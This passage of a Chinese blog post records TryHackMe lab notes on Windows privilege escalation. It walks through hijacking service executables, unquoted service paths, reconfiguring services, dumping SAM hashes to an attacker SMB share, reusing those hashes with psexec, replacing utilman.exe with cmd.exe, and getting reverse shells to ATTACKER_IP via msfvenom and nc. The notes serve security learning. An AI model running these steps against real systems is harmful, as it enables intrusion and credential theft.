class="hljs-variable">NT</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">F</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">BUILTIN</span>\<span class="hljs-variable">Administrators</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">F</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">BUILTIN</span>\<span class="hljs-variable">Users</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">RX</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGE</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">ALL</span> <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGES</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">RX</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGE</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">ALL</span> <span class="hljs-variable">RESTRICTED</span> <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGES</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">RX</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure>
+
+<p>“Everyone”组对服务的可执行文件具有修改权限 （M）。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它</p>
+<p><strong>icacls命令详解</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">在 icacls 命令中，括号中的大写字母代表不同的权限标识符。下面是常见的一些权限标识符及其含义：<br><br>F：完全控制（<span class="hljs-keyword">Full</span> control）<br>M：修改（Modify）<br>RX：读取和执行（<span class="hljs-keyword">Read</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">execute</span>）<br>R：只读（<span class="hljs-keyword">Read</span>）<br>W：写入（<span class="hljs-keyword">Write</span>）<br>N：无权限（<span class="hljs-keyword">None</span>）<br>OI：继承对象（<span class="hljs-keyword">object</span> <span class="hljs-keyword">inherit</span>）<br>CI：继承容器（container <span class="hljs-keyword">inherit</span>）<br>IO：继承仅限（<span class="hljs-keyword">inherit</span> <span class="hljs-keyword">only</span>）<br>GA：通用访问（generic <span class="hljs-keyword">all</span>）<br>GR：通用读取（generic <span class="hljs-keyword">read</span>）<br>GW：通用写入（generic <span class="hljs-keyword">write</span>）<br>GX：通用执行（generic <span class="hljs-keyword">execute</span>）<br>这些权限标识符可以在 icacls 命令中使用，通过为文件或目录指定适当的权限标识符来管理其访问权限。例如，使用以下命令将 &quot;example.txt&quot; 文件的权限设置为只读：<br><br>icacls example.txt /<span class="hljs-keyword">grant</span> Users:R<br><br>上述命令中，&quot;Users&quot; 是用户组，&quot;R&quot; 是只读权限标识符。<br>请注意，在使用 icacls 命令时，确保理解每个权限标识符的含义并谨慎操作，以免误操作导致权限问题。建议在使用该命令进行权限管理之前备份相关文件或目录。<br></code></pre></td></tr></table></figure>
+
+<p>核心思路：篡改可执行文件为反弹马，然后重启服务。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>.生成反弹马<br>msfvenom -<span class="hljs-keyword">p</span> windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4445</span> -<span class="hljs-keyword">f</span> <span class="hljs-keyword">exe</span>-service -<span class="hljs-keyword">o</span> rev-svc.<span class="hljs-keyword">exe</span><br><span class="hljs-number">2</span>.<span class="hljs-keyword">python3</span>到目标机wget http://xxx/xxx -O xxx.<span class="hljs-keyword">exe</span>  //wget 必须加O不然执行不了<br><span class="hljs-number">3</span>.把C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.<span class="hljs-keyword">exe</span>篡改为rev-svc.<span class="hljs-keyword">exe</span>（改名为WService.<span class="hljs-keyword">exe</span>）cmd的<span class="hljs-keyword">move</span>命令<br><span class="hljs-number">4</span>.给所有人权限icacls WService.<span class="hljs-keyword">exe</span> /grant Everyone:F<br><span class="hljs-number">5</span>.kali nc监听<br><span class="hljs-number">6</span>.cmd中重启服务（powershell的sc好像有点问题）<br>C:\&gt; sc <span class="hljs-keyword">stop</span> windowsscheduler<br>C:\&gt; sc start windowsscheduler<br><span class="hljs-number">7</span>.获得<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<p>移动文件时重命名文件 ren xxx.exe bbb.exe</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ws-%E6%8F%90%E6%9D%83/image-20231018162346580.png" srcset="/img/loading.gif" lazyload alt="image-20231018162346580"></p>
+<h6 id="未带引号的服务路径"><a href="#未带引号的服务路径" class="headerlink" title="未带引号的服务路径"></a>未带引号的服务路径</h6><p>找到一个服务叫Disk Sorter Enterprise</p>
+<p>查询他的信息时需要加引号不然查不到他</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ada">sc qc <span class="hljs-string">&quot;Disk Sorter Enterprise&quot;</span><br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: Disk Sorter Enterprise<br>        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">10</span>  WIN32_OWN_PROCESS <br>        START_TYPE         : 2   <span class="hljs-type">AUTO_START</span><br>        ERROR_CONTROL      : 0   <span class="hljs-type">IGNORE</span><br>        BINARY_PATH_NAME   : <span class="hljs-type">C</span>:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe<br>        LOAD_ORDER_GROUP   : <br>        <span class="hljs-type">TAG</span>                : 0<br>        DISPLAY_NAME       : <span class="hljs-type">Disk</span> Sorter Enterprise<br>        DEPENDENCIES       : <br>        <span class="hljs-type">SERVICE_START_NAME</span> : .\<span class="hljs-type">svcusr2</span><br></code></pre></td></tr></table></figure>
+
+<p>BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</p>
+<p>可以icacls C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe  查到这个exe并没有我当前低权用户的权限，但是服务名中间有空格，可以用未带引号的服务路径提权。</p>
+<p>原理</p>
+<p>sc start “Disk Sorter Enterprise” 时，会先往上翻3级目录(<code>字符串中间有两个空格，2+1=3</code>)，查有没有Disk.exe可执行文件，所以只要把上面生成的反弹马放到MyPrograms目录下即可，其余与上面服务提权一致。</p>
+<h6 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h6><p>如果服务 DACL（不是服务的可执行文件的 DACL）允许您修改服务的配置，您将能够<strong>重新配置服务。</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">从命令行检查服务DACL<br><span class="hljs-selector-id">#cd</span> C:\tools\AccessChk<br><span class="hljs-selector-id">#accesschk64</span><span class="hljs-selector-class">.exe</span> -qlc $服务名    <span class="hljs-comment">//重点查看非管理员权限有没有SERVICE_ALL_ACCESS</span><br></code></pre></td></tr></table></figure>
+
+<p>发现一个叫thmservice的服务可以搞，于是上传反弹马，icacls设置权限，用以下命令设置服务的可执行文件路径，攻击机监听，重启服务即可。</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">sc</span> <span class="hljs-variable">config</span> <span class="hljs-title class_">THMService</span> <span class="hljs-variable">binPath</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\f</span>antanmapath<span class="hljs-char escape_">\f</span>antan.exe&quot;</span> <span class="hljs-variable">obj</span><span class="hljs-operator">=</span> <span class="hljs-title class_">LocalSystem</span><br><span class="hljs-comment">//相当于把sc qc中的BINARY_PATH_NAME改了</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="危险特权"><a href="#危险特权" class="headerlink" title="危险特权"></a>危险特权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants</a>  windows特权解释表</p>
+<h6 id="SE-BACKUP-NAME-SE-RESTORE-NAME"><a href="#SE-BACKUP-NAME-SE-RESTORE-NAME" class="headerlink" title="SE_BACKUP_NAME &amp;&amp; SE_RESTORE_NAME"></a><strong>SE_BACKUP_NAME</strong> &amp;&amp; <strong>SE_RESTORE_NAME</strong></h6><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的 DACL。</p>
+<p>此特权的<strong>应用场景</strong>是允许某些用户从系统执行<strong>备份</strong>，而无需完全管理权限。</p>
+<p><strong>利用方式</strong>：直接拖windows administrator的hash值到kali本地，然后连接</p>
+<p><strong>smb实验</strong>！！！以及<strong>windows给kali传文件</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#whoami</span> /priv<br>得到用户有SE_BACKUP_NAME &amp;&amp; SE_RESTORE_NAME权限<br><br><span class="hljs-comment">//备份SAM 和SYSTEM hashes</span><br><span class="hljs-selector-id">#reg</span> save hklm\system C:\Users\THMBackup\system<span class="hljs-selector-class">.hive</span><br><span class="hljs-selector-id">#reg</span> save hklm\sam C:\Users\THMBackup\sam<span class="hljs-selector-class">.hive</span><br><br><span class="hljs-comment">//攻击机使用脚本启用smb服务</span><br><span class="hljs-selector-id">#mkdir</span> share<br><span class="hljs-selector-id">#python3</span> /root/下载/impacket/smbserver<span class="hljs-selector-class">.py</span> -smb2support -username THMBackup -password CopyMaster555 public share<br><br><span class="hljs-comment">//目标机使用以下命令复制到攻击机的share文件夹中</span><br>C:\&gt; copy C:\Users\THMBackup\sam<span class="hljs-selector-class">.hive</span> \\ATTACKER_IP\public\<br>C:\&gt; copy C:\Users\THMBackup\system<span class="hljs-selector-class">.hive</span> \\ATTACKER_IP\public\<br><br><span class="hljs-comment">//kali中cd进入share文件夹,使用脚本导出hash</span><br>python3 /root/下载/impacket/secretsdump<span class="hljs-selector-class">.py</span> -sam sam<span class="hljs-selector-class">.hive</span> -system system<span class="hljs-selector-class">.hive</span> LOCAL<br><br><span class="hljs-comment">//拿取到的admin的hash值连攻击机，还是脚本</span><br>python3 ../psexec<span class="hljs-selector-class">.py</span> -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">8</span>f81ee5558e2d1205a84d07b0e3b34f5 administrator@目标机ip<br></code></pre></td></tr></table></figure>
+
+<h6 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h6><p>成为文件的所有者并不一定意味着您拥有文件的权限，但作为所有者，您可以为自己分配所需的任何权限</p>
+<p>SeTakeOwnership特权允许用户获得系统上<strong>任何对象的所有权</strong>，包括<strong>文件和注册表</strong>项，为攻击者提升特权提供了许多可能性，例如，我们可以搜索作为SYSTEM运行的服务并取得服务的可执行文件的所有权。但是，对于这项任务，我们将采取不同的路线。</p>
+<p>Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：<code>utilman.exe</code></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ws-%E6%8F%90%E6%9D%83/image-20231017014503241.png" srcset="/img/loading.gif" lazyload alt="image-20231017014503241"></p>
+<p>实验过程</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">//</span>发现存在该特权<br><span class="hljs-comment">#whoami /priv</span><br><br>PRIVILEGES INFORMATION<br><span class="hljs-params">----------------------</span><br><br>Privilege Name                Description                              State<br>============================= ======================================== ========<br>SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled<br><br><span class="hljs-string">//</span>获得所有权<br><span class="hljs-comment">#takeown /f C:\Windows\System32\Utilman.exe</span><br><br><span class="hljs-string">//</span>给自己分配完全使用权<br><span class="hljs-comment">#icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><br><span class="hljs-string">//</span>覆盖cmd到utilman中  注意上方命令全部都是在C:\Windows\System32\文件夹中运行的<br><span class="hljs-comment">#copy cmd.exe utilman.exe</span><br><br><span class="hljs-string">//</span>点击左下角、点击头像、点击锁屏、点击utilman图标激活<span class="hljs-string">.exe</span>文件<br></code></pre></td></tr></table></figure>
+
+
+
+<h6 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h6><p>rogueWinRM提权</p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/244201.html">https://cn-sec.com/archives/244201.html</a></p>
+<p>目标机执行以下命令，kali监听即可提权</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">c:\tools\RogueWinRM\RogueWinRM<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;C:\tools\nc64.exe&quot;</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-string">&quot;-e cmd.exe ATTACKER_IP 4442&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="易受攻击的软件"><a href="#易受攻击的软件" class="headerlink" title="易受攻击的软件"></a>易受攻击的软件</h5><p>&#x2F;&#x2F;列出目标系统上安装的软件及其版本，不是很全，还可以检查桌面快捷方式、可用服务</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span>,vendor<br></code></pre></td></tr></table></figure>
+
+<p>然后上exploitdb找</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>tryhackme_windows_提权</div>
+      <div>http://groundctl2majortom.github.io/2023/08/12/tryhackme-windows-提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/22/tryhackme-offensive-pentesting/" title="tryhackme_offensive_pentesting">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">tryhackme_offensive_pentesting</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/08/tryhackme-linux-%E6%8F%90%E6%9D%83/" title="tryhackme_linux_提权">
+                        <span class="hidden-mobile">tryhackme_linux_提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
